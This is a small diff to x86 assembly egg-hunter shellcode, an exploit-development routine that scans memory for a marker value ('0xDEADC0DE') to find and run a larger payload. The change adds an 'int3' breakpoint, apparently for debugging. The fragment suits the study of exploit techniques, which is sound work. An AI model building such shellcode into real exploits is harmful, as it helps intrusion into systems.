@@ -50,6 +50,7 @@ nxt_addr:
     test    eax, eax
     jnz     nxt_page  ; eax is zero if page is ok 
     
+    int3
     ; put your own egg signature here
     mov     eax, 0xDEADC0DE
     scasd
